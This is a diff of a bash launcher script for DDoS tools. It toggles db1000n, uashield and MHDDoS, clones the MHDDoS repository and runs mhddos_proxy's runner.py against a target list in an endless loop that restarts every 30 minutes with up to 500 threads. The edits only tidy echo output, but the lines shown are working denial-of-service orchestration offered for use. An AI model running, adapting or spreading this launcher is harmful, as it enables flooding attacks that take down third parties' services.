@@ -171,7 +171,7 @@ while [ "$1" != "" ]; do
     case $1 in
         +d | --db1000n )   db1000n="on"; shift ;;
         +u | --uashield )   uashield="on"; shift ;;
-        -t | --threads )   export threads="-t $2"; echo $threads; t_set_manual="on"; shift 2 ;;
+        -t | --threads )   export threads="-t $2"; t_set_manual="on"; shift 2 ;;
         +m | --matrix )   matrix="on"; shift ;;
         -g | --gotop ) gotop="off"; db1000n="off"; shift ;;
         +v | --vnstat ) vnstat="on"; shift ;;
@@ -190,7 +190,6 @@ if [[ $t_set_manual != "on" ]]; then
     else
         threads="-t 500" #safe value in case something go wrong
     fi
-echo $threads
 export threads
 fi
 
@@ -213,8 +212,8 @@ git clone https://github.com/MHProDev/MHDDoS.git
 
 # Restart attacks and update targets every 30 minutes
 while true; do
-echo "threads:"$threads
-echo "methods:"$methods
+echo "threads: "$threads
+echo "methods: "$methods
 sleep 2
         pkill -f start.py; pkill -f runner.py 
         python3 ~/multidd/mhddos_proxy/runner.py -c $main_targets $threads $methods&
